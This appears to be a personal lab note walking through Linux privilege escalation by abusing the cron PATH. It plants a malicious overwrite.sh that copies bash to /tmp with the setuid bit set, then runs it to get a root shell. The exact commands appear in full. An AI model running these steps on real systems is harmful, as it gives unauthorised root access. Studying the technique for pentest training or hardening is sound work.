Here we will see how to modify the path on which the cron executes the scripts in order to force the execution of a malicious one.


As we can see using:
```bash
cat /etc/crontab
```
- ![[Pasted image 20250117155549.png]]
	- we have a path in which it searchs for the scripts and task to execute
	- it starts with `/home/user`
- ![[Pasted image 20250117155755.png]]
	- it searches for `overwrite.sh` into `/home/user`

So we can check on that path:
```bash
ls -la /home/user
```
- ![[Pasted image 20250117155703.png]]


Here we can see that the `overwrite.sh` doesn't exist.


# Creating malicious `overwrite.sh`

Now, if we have the permission to write into `/home/user` the game is done.

We just need to create a malicious file:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

Then we make it executable:
```bash
chmod +x /home/user/overwrite.sh
```


So now the system will do everything:
- it will create a binary `bash` in `/tmp` that is accessible by everyone
- ![[Pasted image 20250117160137.png]]


So we just need to run it:
```bash
/tmp/bash -p
```
- and the game is done
- ![[Pasted image 20250117160242.png]]

<mark style="background: #BBFABBA6;">We gain the root shell!</mark>

